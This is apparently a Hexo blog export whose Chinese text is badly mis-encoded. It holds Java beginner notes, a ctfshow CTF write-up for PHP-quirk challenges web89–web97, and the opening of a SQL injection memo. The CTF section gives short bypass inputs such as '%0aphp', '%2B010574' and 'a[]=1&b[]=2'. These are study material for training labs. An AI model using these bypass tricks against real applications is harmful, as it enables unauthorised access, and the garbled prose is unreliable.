<h1 id="Arraysç±»çš„å°åº”ç”¨"><a href="#Arraysç±»çš„å°åº”ç”¨" class="headerlink" title="Arraysç±»çš„å°åº”ç”¨"></a>Arraysç±»çš„å°åº”ç”¨</h1><p>å…ˆæŠŠäºŒç»´æ•°ç»„[ä½¿ç”¨System.arraycopyè¿›è¡Œæ•°ç»„å¤åˆ¶åˆ°ä¸€ä¸ªä¸€ç»´æ•°ç»„<br>ç„¶åä½¿ç”¨sortè¿›è¡Œæ’åº<br>æœ€åå†å¤åˆ¶å›åˆ°äºŒç»´æ•°ç»„</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    	<span class="comment">//Select(a);</span></span><br><span class="line">    	<span class="comment">//Bubble(a);</span></span><br><span class="line">    	<span class="type">int</span> a[][] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>][<span class="number">3</span>];</span><br><span class="line">    	<span class="type">int</span> b[] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">9</span>];</span><br><span class="line">    	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">    		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">3</span>;j++)&#123;</span><br><span class="line">    			a[i][j]=(<span class="type">int</span>)(Math.random()*<span class="number">100</span>);</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    	</span><br><span class="line">    	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">    		System.arraycopy(a[i], <span class="number">0</span>, b, i*<span class="number">3</span>, <span class="number">3</span>);</span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line">    	</span><br><span class="line">    	Arrays.sort(b);</span><br><span class="line">    	</span><br><span class="line">    	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">    		System.arraycopy(b, i*<span class="number">3</span>, a[i], <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">    	</span><br><span class="line">    	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">    		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">3</span>;j++)&#123;</span><br><span class="line">    			System.out.println(a[i][j]);</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;	</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="ç»™æ–¹æ³•ä¼ é€’ä¸€ä¸ªå¼•ç”¨æ•°ç»„"><a href="#ç»™æ–¹æ³•ä¼ é€’ä¸€ä¸ªå¼•ç”¨æ•°ç»„" class="headerlink" title="ç»™æ–¹æ³•ä¼ é€’ä¸€ä¸ªå¼•ç”¨æ•°ç»„"></a>ç»™æ–¹æ³•ä¼ é€’ä¸€ä¸ªå¼•ç”¨æ•°ç»„</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> j2se;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ADHero</span> <span class="keyword">extends</span> <span class="title class_">Hero</span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">attack</span><span class="params">(Hero ... heros)</span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;heros.length;i++)&#123;</span><br><span class="line">			System.out.println(heros[<span class="number">0</span>].name+<span class="string">&quot;æ”»å‡»äº†&quot;</span>+heros[i].name+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="type">ADHero</span> <span class="variable">ewoji</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ADHero</span>();</span><br><span class="line">		<span class="type">ADHero</span> <span class="variable">chaospeo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ADHero</span>();</span><br><span class="line">		<span class="type">ADHero</span> <span class="variable">orxiain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ADHero</span>();</span><br><span class="line">		<span class="type">ADHero</span> <span class="variable">boogipop</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ADHero</span>();</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		ewoji.name = <span class="string">&quot;ewoji&quot;</span>;</span><br><span class="line">		chaospeo.name= <span class="string">&quot;chaospeo&quot;</span>;</span><br><span class="line">		orxiain.name = <span class="string">&quot;orxianin&quot;</span>;</span><br><span class="line">		boogipop.name = <span class="string">&quot;boogipop&quot;</span>;</span><br><span class="line">		</span><br><span class="line">		ewoji.attack(ewoji,chaospeo,orxiain,boogipop);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="é¥¿æ±‰å¼å•ä¾‹æ¨¡å¼"><a href="#é¥¿æ±‰å¼å•ä¾‹æ¨¡å¼" class="headerlink" title="é¥¿æ±‰å¼å•ä¾‹æ¨¡å¼"></a>é¥¿æ±‰å¼å•ä¾‹æ¨¡å¼</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GiantDragon</span> &#123;</span><br><span class="line">	</span><br><span class="line">	<span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;é¾™ç‹&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="type">double</span> <span class="variable">hp</span> <span class="operator">=</span> <span class="number">1000.0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="type">double</span> <span class="variable">Armor</span> <span class="operator">=</span> <span class="number">100.0</span>;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="title function_">GiantDragon</span><span class="params">()</span>&#123;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="type">GiantDragon</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GiantDragon</span>();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> GiantDragon <span class="title function_">getDragon</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> instance;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//----------------------------------------------------//</span></span><br><span class="line">	<span class="comment">//----------------------------------------------------//</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="type">GiantDragon</span> <span class="variable">one</span> <span class="operator">=</span> GiantDragon.getDragon();</span><br><span class="line">		System.out.println(one.name+one.hp+one.Armor);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„GiantDragon instanceå’ŒgetDragon()å¿…ä¿®éƒ½è¦ç”¨staticä¿®é¥°</p>
<p>å‰è€…æ˜¯ä¸ºäº†åœ¨ä¸å®ä¾‹åŒ–çš„æƒ…å†µä¸‹å°±æŠŠå”¯ä¸€çš„å¤§é¾™å¯¹è±¡å®ä¾‹åŒ–</p>
<p>åè€…æ˜¯ä¸ºäº†åœ¨ä¸å®ä¾‹åŒ–çš„æƒ…å†µä¸‹ç›´æ¥è®¿é—®è¿™ä¸ªæ–¹æ³•</p>
<h1 id="æ‡’æ±‰å¼å•ä¾‹æ¨¡å¼"><a href="#æ‡’æ±‰å¼å•ä¾‹æ¨¡å¼" class="headerlink" title="æ‡’æ±‰å¼å•ä¾‹æ¨¡å¼"></a>æ‡’æ±‰å¼å•ä¾‹æ¨¡å¼</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">GiantDragon</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> GiantDragon instance;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> GiantDragon <span class="title function_">getDragon</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="literal">null</span>==instance)&#123;</span><br><span class="line">			instance = <span class="keyword">new</span> <span class="title class_">GiantDragon</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> instance;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>å’Œé¥¿æ±‰å¼çš„åŒºåˆ«æ˜¯ï¼Œå®ƒä¸ä¼šç›´æ¥åŠ è½½è¿™ä¸ªå®ä¾‹instanceï¼Œè€Œæ˜¯å½“ä½ è°ƒç”¨getDragon()çš„æ—¶å€™æ‰ä¼šåˆ›é€ è¿™ä¸ªå®ä¾‹</p>
<h1 id="åˆ©ç”¨æ¥å£å®ç°ç±»çš„å¤šæ€"><a href="#åˆ©ç”¨æ¥å£å®ç°ç±»çš„å¤šæ€" class="headerlink" title="åˆ©ç”¨æ¥å£å®ç°ç±»çš„å¤šæ€"></a>åˆ©ç”¨æ¥å£å®ç°ç±»çš„å¤šæ€</h1><p>Motalæ¥å£</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Mortal</span> &#123;</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">die</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‡½æ•°çš„é‡å†™</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">APHero</span> <span class="keyword">extends</span> <span class="title class_">Hero</span> <span class="keyword">implements</span> <span class="title class_">AP</span>,Mortal &#123;</span><br><span class="line">	<span class="comment">//æ³•æœ¯å¹³A</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">magicAttack</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;æ³•æœ¯å¹³A&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//æ­»</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">die</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="built_in">this</span>.name+<span class="string">&quot;æ­»äº¡&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ€</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">kill</span><span class="params">(Mortal m)</span>&#123;</span><br><span class="line">    	m.die();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Hero</span> <span class="variable">ewoji</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        <span class="type">ADHero</span> <span class="variable">go</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ADHero</span>();</span><br><span class="line">        go.name = <span class="string">&quot;chaospeo&quot;</span>;</span><br><span class="line">        ewoji.kill(go);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¼ å…¥çš„æ˜¯ä¸€ä¸ªæ¥å£</p>
<h1 id="å­ç±»ä½¿ç”¨çˆ¶ç±»çš„å¸¦å‚åˆå§‹åŒ–æ–¹æ³•"><a href="#å­ç±»ä½¿ç”¨çˆ¶ç±»çš„å¸¦å‚åˆå§‹åŒ–æ–¹æ³•" class="headerlink" title="å­ç±»ä½¿ç”¨çˆ¶ç±»çš„å¸¦å‚åˆå§‹åŒ–æ–¹æ³•"></a>å­ç±»ä½¿ç”¨çˆ¶ç±»çš„å¸¦å‚åˆå§‹åŒ–æ–¹æ³•</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//åˆå§‹åŒ–</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">APHero</span><span class="params">(String name,<span class="type">double</span> hp)</span>&#123;</span><br><span class="line">		<span class="built_in">super</span>(name,hp);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h1 id="é‡å†™equalsæ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡å†…å®¹æ˜¯å¦ç›¸ç­‰"><a href="#é‡å†™equalsæ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡å†…å®¹æ˜¯å¦ç›¸ç­‰" class="headerlink" title="é‡å†™equalsæ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡å†…å®¹æ˜¯å¦ç›¸ç­‰"></a>é‡å†™equalsæ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡å†…å®¹æ˜¯å¦ç›¸ç­‰</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">float</span> hp;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(o <span class="keyword">instanceof</span> Hero)&#123;</span><br><span class="line">            <span class="type">Hero</span> <span class="variable">h</span> <span class="operator">=</span> (Hero) o;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.hp == h.hp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Hero h1= <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        h1.hp = <span class="number">300</span>;</span><br><span class="line">        Hero h2= <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        h2.hp = <span class="number">400</span>;</span><br><span class="line">        Hero h3= <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        h3.hp = <span class="number">300</span>;</span><br><span class="line">         </span><br><span class="line">        System.out.println(h1.equals(h2));</span><br><span class="line">        System.out.println(h1.equals(h3));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœä¸é‡å†™çš„è¯ï¼ŒObjectçš„åªä¼šæ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡çš„å¼•ç”¨æ˜¯å¦æŒ‡å‘ä¸€ä¸ªå¯¹è±¡</p>
<h1 id="åˆ©ç”¨éé™æ€å†…éƒ¨ç±»å’Œé™æ€å†…éƒ¨ç±»æœåŠ¡å¤–éƒ¨ç±»"><a href="#åˆ©ç”¨éé™æ€å†…éƒ¨ç±»å’Œé™æ€å†…éƒ¨ç±»æœåŠ¡å¤–éƒ¨ç±»" class="headerlink" title="åˆ©ç”¨éé™æ€å†…éƒ¨ç±»å’Œé™æ€å†…éƒ¨ç±»æœåŠ¡å¤–éƒ¨ç±»"></a>åˆ©ç”¨éé™æ€å†…éƒ¨ç±»å’Œé™æ€å†…éƒ¨ç±»æœåŠ¡å¤–éƒ¨ç±»</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//åˆ†æ•°ç±»,éé™æ€ï¼Œå¯è®¿é—®å¤–éƒ¨ç±»å˜é‡</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">BattleScore</span>&#123;</span><br><span class="line">    	<span class="type">int</span> kill;</span><br><span class="line">    	<span class="type">int</span> die;</span><br><span class="line">    	<span class="type">int</span> assit;</span><br><span class="line">    	</span><br><span class="line">    	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">legendary</span><span class="params">()</span>&#123;</span><br><span class="line">    		<span class="keyword">if</span>(kill &gt; <span class="number">8</span>)</span><br><span class="line">    			System.out.println(name+<span class="string">&quot;è¶…ç¥ï¼&quot;</span>);</span><br><span class="line">    		<span class="keyword">else</span></span><br><span class="line">    			System.out.println(name+<span class="string">&quot;å°šæœªè¶…ç¥&quot;</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//æ°´æ™¶ç±»,é™æ€,ä¸å¯è®¿é—®å¤–éƒ¨ç±»å˜é‡</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EnemyCrystal</span>&#123;</span><br><span class="line">    	<span class="type">int</span> <span class="variable">hp</span> <span class="operator">=</span> <span class="number">5000</span>;</span><br><span class="line">    	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkIfVictory</span><span class="params">()</span>&#123;</span><br><span class="line">    		<span class="keyword">if</span>(hp==<span class="number">0</span>)&#123;</span><br><span class="line">    			Hero.battleWin();</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br></pre></td></tr></table></figure>

<h1 id="è½¬æ¢ä¸ºå­—ç¬¦ä¸²çš„ä¸¤ç§æ–¹æ³•"><a href="#è½¬æ¢ä¸ºå­—ç¬¦ä¸²çš„ä¸¤ç§æ–¹æ³•" class="headerlink" title="è½¬æ¢ä¸ºå­—ç¬¦ä¸²çš„ä¸¤ç§æ–¹æ³•"></a>è½¬æ¢ä¸ºå­—ç¬¦ä¸²çš„ä¸¤ç§æ–¹æ³•</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//ä½¿ç”¨Stringç±»çš„é™æ€æ–¹æ³•valueOf()è½¬åŒ–</span><br><span class="line">		int go = 222222;</span><br><span class="line">		String str = String.valueOf(go);</span><br><span class="line"></span><br><span class="line">		//ä½¿ç”¨Obejectç±»çš„æ–¹æ³•toString()è½¬åŒ–</span><br><span class="line">		Integer it = go;</span><br><span class="line">		String go1 = it.toString();</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPç‰¹æ€§ctfshow</title>
    <url>/2024/03/02/PHP%E7%89%B9%E6%80%A7ctfshow/</url>
    <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>

<h1 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302112347828.png"  alt="image-20240302112347828"></p>
<p><code>intval()</code>è·å–å˜é‡çš„æ•´æ•°å€¼ï¼Œå¦‚æœæ˜¯å˜é‡æ˜¯æ•°ç»„çš„è¯ï¼Œè¦çœ‹æ•°ç»„é‡Œé¢æœ‰æ²¡æœ‰å…ƒç´ ï¼Œæœ‰å…ƒç´ è¿”å›1ï¼Œæ²¡æœ‰å…ƒç´ è¿”å›0ï¼Œè¿™é‡Œä¼ å…¥ä¸€ä¸ªæœ‰å…ƒç´ çš„æ•°ç»„å³å¯</p>
<h1 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302113937890.png"  alt="image-20240302113937890"></p>
<p><code>intval()</code>çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯ç”¨æ¥è¯†åˆ«å‰ä¸€ä¸ªå‚æ•°æ˜¯ä»€ä¹ˆè¿›åˆ¶ï¼Œå¦‚æœä¸º0ï¼Œå°±æ˜¯è‡ªåŠ¨æ£€æµ‹ï¼Œ0xå¼€å¤´çš„ä¼šè¢«è¯†åˆ«ä¸º16è¿›åˆ¶ï¼Œ0å¼€å¤´ä¼šè¢«è¯†åˆ«ä¸º8è¿›åˆ¶ï¼Œå¦åˆ™ï¼Œå°†ä½¿ç”¨10è¿›åˆ¶ï¼Œè¿™é‡Œç¬¬äºŒä¸ªå‚æ•°é»˜è®¤ä¸º10ï¼Œå°±æ˜¯æŒ‰åè¿›åˆ¶è¯†åˆ«</p>
<p>æ‰€ä»¥æŠŠ4476è½¬ä¸º16è¿›åˆ¶ï¼Œåœ¨å¼€å¤´åŠ å…¥0xä¼ å…¥å³å¯</p>
<h1 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302125706558.png"  alt="image-20240302125706558"></p>
<p>å…ˆçœ‹è¿™é‡Œä¸¤ä¸ªæ­£åˆ™&#x2F;^php$&#x2F;im,&#x2F;^php$&#x2F;i</p>
<p>i:ä¸åŒºåˆ†å¤§å°å†™åŒ¹é…</p>
<p>m:ä»¥æ¯è¡Œä¸ºä¸€ä¸ªå•ä½åŒ¹é…</p>
<p>^:åŒ¹é…å•ä½çš„å¼€å¤´</p>
<p>$:åŒ¹é…å•ä½çš„æœ«å°¾</p>
<p>è¿™é¢˜è¦æ±‚æˆ‘ä»¬æ—¢è¦æ»¡è¶³ç¬¬ä¸€ä¸ªæ­£åˆ™ï¼Œåˆä¸æ»¡è¶³ç¬¬äºŒä¸ªæ­£åˆ™ï¼Œè€Œä¸¤ä¸ªçš„åŒºåˆ«åœ¨äºmï¼Œå¤šè¡ŒåŒ¹é…ä¸å¦çš„é—®é¢˜</p>
<p>è¿™é‡Œçš„^xxx$æ„æ€è¯´è¦åŒ¹é…çš„å•ä½åªèƒ½æ˜¯xxxï¼Œä¸è¦ä»€ä¹ˆéƒ½åŒ¹é…ä¸åˆ°</p>
<p>é‚£ä¹ˆæˆ‘ä»¬åªè¦åœ¨ç¬¬äºŒè¡Œæœ‰phpï¼Œç¬¬ä¸€è¡Œæ²¡æœ‰ï¼Œå°±æ»¡è¶³äº†</p>
<p><strong>payload:%0aphp</strong></p>
<p>%0aæ˜¯urlç¼–ç çš„æ¢è¡Œç¬¦</p>
<h1 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302130355748.png"  alt="image-20240302130355748"></p>
<p>å¯ä»¥ä¼ å…¥4476e1,å¼±æ¯”è¾ƒæ—¶ä¹Ÿä¸ä¼šæŠŠå®ƒè½¬åŒ–ä¸º4476ï¼Œå› ä¸ºeä¸€èˆ¬è¡¨ç¤ºç§‘å­¦è®¡æ•°æ³•ï¼Œå®ƒè½¬åŒ–ä¸ºä»€ä¹ˆå°±ä¸çŸ¥é“äº†,ä½†æ˜¯intvalå´å¯ä»¥è½¬åŒ–ä¸º4476</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240302140721408.png"  alt="image-20240302140721408"></p>
<p>è¿™é‡Œhintæ˜¯é”™çš„ï¼ŒéªŒè¯è¿‡äº†ï¼Œå…¶ä»–å­—æ¯ä¼šè¢«å¼±ç­‰äºè½¬åŒ–ç„¶åè¾“å‡ºnonono</p>
<h1 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302132556869.png"  alt="image-20240302132556869"></p>
<p>ä¸Šé¢è¯´äº†0å¼€å¤´ä¼šä»¥å…«è¿›åˆ¶è¯†åˆ«</p>
<h1 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302134509330.png"  alt="image-20240302134509330"></p>
<p>è¦æƒ³è¾“å‡ºflagï¼Œæœ‰ä¸‰ä¸ªæ¡ä»¶</p>
<p>1.numä¸èƒ½å¼ºç­‰äº4476</p>
<p>2.numä¸­ä¸èƒ½æœ‰å­—æ¯</p>
<p>3.numçš„å¼€å¤´ä¸èƒ½æ˜¯0(<code>strpos()</code>ä¼šè¿”å›0ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œä»0å¼€å§‹)</p>
<p>ç¬¬ä¸€ç§æ–¹æ³•:</p>
<p>ç»•è¿‡<code>strpos()</code>ä¼ å…¥+010574,å…¶ä¸­+ä¸èƒ½åœ¨urlä¸­ç›´æ¥è¾“å…¥ï¼Œä¼šè¢«è§£æä¸ºç©ºæ ¼,è¦è¾“å…¥%2B010574</p>
<p>ç¬¬äºŒç§æ–¹æ³•:</p>
<p>ç»•è¿‡å¼ºç­‰äºï¼Œç›´æ¥ä¼ å…¥4476.0ï¼Œå¼ºåº¦äºä¸¤è¾¹æ•°æ®ç±»å‹ä¸åŒç›´æ¥è¿”å›false</p>
<h1 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302135645125.png"  alt="image-20240302135645125"></p>
<p>å¼±ç­‰äºï¼Œç”¨ä»¥ä¸Šç¬¬ä¸€ç§æ–¹æ³•</p>
<h1 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302141223598.png"  alt="image-20240302141223598"></p>
<p>ä¼ å…¥.&#x2F;flag.phpå³å¯</p>
<h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302201703858.png"  alt="image-20240302201703858"></p>
<p>å¼ºåº¦äºï¼Œæ•°ç»„ç»•è¿‡</p>
<p><code>md5()</code>è¢«ä¼ å…¥ä¸€ä¸ªæ•°ç»„æ—¶ï¼Œä¼šè¿”å›nullï¼Œäºæ˜¯æˆ‘ä»¬ä¼ å…¥ä¸¤ä¸ªæ•°ç»„ï¼Œç»“æœå°±æ˜¯null&#x3D;&#x3D;&#x3D;null,å³å¯ç»•è¿‡</p>
<p>payload:a[]&#x3D;1&amp;b[]&#x3D;2</p>
<h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1><p>åˆ°è¿™å…ˆï¼Œå…ˆå»å­¦åˆ«çš„å¤§ç±»æ¼æ´å§</p>
]]></content>
      <categories>
        <category>å­¦ä¹ </category>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>å…¥é—¨</tag>
        <tag>å­¦ä¹ </tag>
        <tag>php</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLæ³¨å…¥å¤‡å¿˜å½•</title>
    <url>/2024/05/10/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    <content><![CDATA[<h1 id="more-deeper"><a href="#more-deeper" class="headerlink" title="more deeper"></a>more deeper</h1><span id="more"></span>

<h1 id="å…ƒæ•°æ®åº“-information-schema"><a href="#å…ƒæ•°æ®åº“-information-schema" class="headerlink" title="å…ƒæ•°æ®åº“:information_schema"></a>å…ƒæ•°æ®åº“:information_schema</h1><h2 id="æ’ä¸€å˜´"><a href="#æ’ä¸€å˜´" class="headerlink" title="æ’ä¸€å˜´"></a>æ’ä¸€å˜´</h2><p>schemaç¿»è¯‘ä¸ºå›¾è§£ï¼Œå›¾ç•¥ã€‚é¡¾åæ€ä¹‰è¿™ä¸ªåº“å°±æ˜¯æˆ‘ä»¬æ•´ä¸ªmysqlæ•°æ®åº“çš„å›¾ç•¥ï¼Œå®ƒåŒ…å«äº†æ‰€æœ‰åº“ï¼Œè¡¨ï¼Œåˆ—çš„åç§°ï¼Œä½†ä¸åŒ…å«å…·ä½“ä¿¡æ¯ã€‚</p>
<h2 id="èƒ½åšä»€ä¹ˆ"><a href="#èƒ½åšä»€ä¹ˆ" class="headerlink" title="èƒ½åšä»€ä¹ˆ"></a>èƒ½åšä»€ä¹ˆ</h2><p>1.åœ¨å¼€å‘è€…ä½¿ç”¨ä¸­ï¼Œæˆ‘ä»¬ç”¨çš„<code>show databases</code>,<code>show tables</code>,<code>show columns from xxx</code>ç­‰å‘½ä»¤å›æ˜¾çš„æ•°æ®å°±æ˜¯ç›´æ¥ä»è¿™ä¸ªå›¾ç•¥è·å–çš„</p>
<p>2.åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œå¯¹æˆ‘ä»¬æ¢æµ‹æ•°æ®ååˆ†æœ‰ä½œç”¨ï¼Œå¯ä»¥è¯´æ˜¯èµ·å†³å®šæ€§ä½œç”¨</p>
